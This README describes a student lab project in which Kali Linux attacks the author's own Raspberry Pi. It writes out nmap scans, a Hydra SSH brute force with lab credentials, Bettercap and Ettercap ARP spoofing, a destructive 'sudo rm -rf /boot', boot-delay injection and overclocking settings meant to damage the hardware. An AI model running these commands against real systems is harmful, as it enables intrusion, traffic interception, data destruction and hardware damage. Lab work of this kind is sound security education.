
# 🔐 Raspberry Pi Penetration Testing Project

A comprehensive penetration testing project demonstrating various attack vectors against a Raspberry Pi target device. This project uses **Kali Linux as the attacking platform** to perform penetration testing against a **Raspberry Pi running Raspbian OS as the target**. Attack vectors demonstrated include Man-in-the-Middle attacks, network discovery, SSH exploitation, boot partition manipulation, and hardware-level attacks.

> ⚠️ **LEGAL NOTICE**: Use only on systems you own or have explicit written authorization to test. You are responsible for complying with all applicable laws and policies.

---

## Table of Contents

- [Project Overview](#project-overview)
- [Setup](#setup)
- [Attack Techniques](#attack-techniques)
  - [Network Discovery & Scanning](#network-discovery--scanning)
  - [Brute-force Attack (Hydra)](#brute-force-attack-hydra)
  - [Man-in-the-Middle (MITM) Attacks](#man-in-the-middle-mitm-attacks)
  - [SSH Access & Boot Partition Inspection](#ssh-access--boot-partition-inspection)
  - [Boot Delay Injection & File Editing](#boot-delay-injection--file-editing)
  - [Overclocking & Hardware Impact](#overclocking--hardware-impact)
- [Safety and Recovery Procedures](#safety-and-recovery-procedures)
- [Project Structure](#project-structure)
- [Prerequisites](#prerequisites)
- [Installation Requirements](#installation-requirements)
- [Ethical Guidelines](#ethical-guidelines)

---

## Project Overview

This project demonstrates penetration testing techniques where:
- **Attacking Platform**: Kali Linux virtual machine (VMware)
- **Target Device**: Raspberry Pi 4 Model B running 64-bit Raspbian OS

Attack techniques covered:
- Man-in-the-Middle (MITM) attacks using Bettercap, Ettercap & Wireshark
- Network discovery and scanning techniques from Kali Linux
- SSH brute-force attacks against the Raspberry Pi
- Remote access and privilege escalation on the target
- Boot partition inspection and manipulation on the Raspberry Pi
- Destructive testing and recovery procedures
- Boot delay injection attacks
- Hardware overclocking attacks targeting the Pi's configuration
- File system manipulation on the target device

---

## Setup

**Target Device Setup (Raspberry Pi):**
1. Flash and install the 64-bit Raspbian operating system to an SD card using an SD card reader.
2. Connect the Raspberry Pi (Raspberry Pi 4 Model B) to a monitor, keyboard, and power.
3. Configure SSH access on the Raspberry Pi target.

**Attacking Platform Setup (Kali Linux):**
1. Use a Kali Linux virtual machine (VMware) to perform the penetration tests.
2. Ensure network connectivity between Kali Linux and the Raspberry Pi target.
3. Install required penetration testing tools (most come pre-installed with Kali).

---

## Attack Techniques

### Network Discovery & Scanning

**From Kali Linux attacking machine:**

Discover devices on the network (including the Raspberry Pi target):
```bash
arp -a
```

**Network Scanning:**

Scan the Raspberry Pi target and other hosts:
```bash
arp -a
nmap -Pn 192.168.XX.X  # Replace with Raspberry Pi's IP
```

These commands from Kali Linux locate the Raspberry Pi target and identify services for further exploitation.

### Brute-force Attack (Hydra)

**From Kali Linux attacking machine:**

Create `username` and `password` lists (two text documents). Example files: `username.txt` and `password.txt` (these files included the correct credentials used in the test: `CSE` / `CSE`).

Run Hydra from Kali Linux against the Raspberry Pi's SSH service:
```bash
hydra -L <path_to_username_list> -P <path_to_password_list> ssh://<raspberry_pi_ip>
```

### Man-in-the-Middle (MITM) Attacks

**Bettercap Setup and Usage (from Kali Linux):**

Install Bettercap on Kali Linux (if not already installed):
```bash
sudo apt install bettercap
```

Launch Bettercap with elevated privileges:
```bash
sudo bettercap
```

In-session commands for ARP spoofing against the Raspberry Pi target:
```bash
net.show
set arp.spoof.targets 192.168.121.174  # Raspberry Pi target IP
arp.spoof on
net.sniff on
```

**Ettercap GUI Method (from Kali Linux):**

Launch Ettercap with GUI:
```bash
ettercap -G
```

Follow GUI workflow to target the Raspberry Pi:
1. Scan the network for hosts (including the Raspberry Pi)
2. Select the Raspberry Pi as target
3. Start ARP poisoning against the Pi
4. Monitor intercepted traffic from the Pi

**Wireshark Analysis (from Kali Linux):**

Launch Wireshark for packet analysis:
```bash
wireshark
```

These steps allow interception and observation of network traffic originating from the Raspberry Pi target.

### SSH Access & Boot Partition Inspection

**After gaining SSH access to the Raspberry Pi from Kali Linux:**

Once SSH credentials are obtained (via brute-force or other means), connect from Kali Linux:
```bash
ssh CSE@<raspberry_pi_ip>
```

**Boot Partition Inspection (on the Raspberry Pi target):**

After obtaining SSH access, inspect the boot partition:
```bash
ls -lah /boot/firmware
```

**⚠️ DESTRUCTIVE TEST (Lab Environment Only):**

In a controlled test environment, critical boot files can be removed on the Raspberry Pi:
```bash
sudo rm -rf /boot
```

**WARNING**: This renders the Raspberry Pi unbootable. Recovery requires:
1. Reimaging the SD card
2. Reinstalling Raspbian OS

### Boot Delay Injection & File Editing

**Executed remotely on the Raspberry Pi target via SSH from Kali Linux:**

**Availability Attack - Boot Delay:**

Append boot delay to configuration on the Raspberry Pi:
```bash
echo "boot_delay=60" | sudo tee -a /path/to/config.txt
```

**System File Modification on Raspberry Pi:**

Edit system files on the target:
```bash
sudo nano /path/to/file.txt
```

**Impact**: These modifications can produce multi-hour boot delays on the Raspberry Pi, demonstrating how attackers can impact system availability through remote configuration file manipulation.

### Overclocking & Hardware Impact

**Executed remotely on the Raspberry Pi target via SSH from Kali Linux:**

**⚠️ DANGEROUS - Lab Testing Only:**

Modify `/boot/config.txt` on the Raspberry Pi with aggressive overclocking settings:
```bash
sudo nano /boot/config.txt
```

Add the following dangerous settings to the Raspberry Pi's configuration:
```
force_turbo=1
over_voltage=8
arm_freq=2400
gpu_freq=850
```

**Results Observed on the Raspberry Pi:**
- Excessive heat generation
- System instability
- Failure to reboot
- Potential hardware damage

**Risk Assessment**: Demonstrates thermal and hardware risks from unsafe configuration changes applied remotely to the target device.

---

## Safety and Recovery Procedures

### Recovery Methods

1. **SD Card Recovery:**
   - Reimage SD card with fresh OS
   - Restore from backup if available

2. **Configuration Rollback:**
   - Boot from recovery mode
   - Restore original config files
   - Remove malicious modifications

3. **Hardware Reset:**
   - Remove power completely
   - Allow cooling period for overheated components
   - Check for physical damage

---

## Project Structure

```
Penetration-Testing-using-Raspberry-pi/
├── Docs/                     # Documentation and reports
│   ├── 2ND REPORT RASPBERRY.pdf
│   ├── Bootloader_Presentation.pdf
│   ├── Raspberry Pi As A Target_updated.pdf
│   └── Raspberry pi report 3.pdf
├── scripts/                  # Attack scripts and tools
├── logs/                     # Attack logs and evidence
└── README.md                 # This documentation
```

---

## Prerequisites

**Attacking Platform (Kali Linux):**
- Kali Linux virtual machine (VMware recommended)
- Network connectivity to target network
- Penetration testing tools (pre-installed with Kali)

**Target Device (Raspberry Pi):**
- Raspberry Pi (3B+ or 4 recommended)
- Raspbian OS (64-bit preferred)
- SSH enabled on the target device
- Network access for remote attacks

**Legal Requirements:**
- **Written authorization for all testing**
- Controlled lab environment
- No production systems

---

## Installation Requirements

**On Kali Linux (Attacking Platform):**
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install additional penetration testing tools (if needed)
sudo apt install -y bettercap ettercap-text-only wireshark nmap hydra

# Most tools come pre-installed with Kali Linux
```

**On Raspberry Pi (Target - for setup only):**
```bash
# Update target system
sudo apt update && sudo apt upgrade -y

# Enable SSH service
sudo systemctl enable ssh
sudo systemctl start ssh
```

---

## Ethical Guidelines

- Only test on systems you own or have explicit permission to test
- Document all activities for learning purposes
- Immediately report any unintended access or damage
- Follow responsible disclosure practices
- Ensure destructive tests are performed only in isolated lab environments

---

## Learning Outcomes

Upon completion, you will understand:
- Network traffic interception techniques
- ARP spoofing and MITM attack vectors
- Boot process manipulation
- Hardware-level attack surfaces
- Recovery and incident response procedures
- The importance of proper security configurations

---

**Disclaimer**: This project is for educational purposes only. All techniques should be used responsibly and legally.
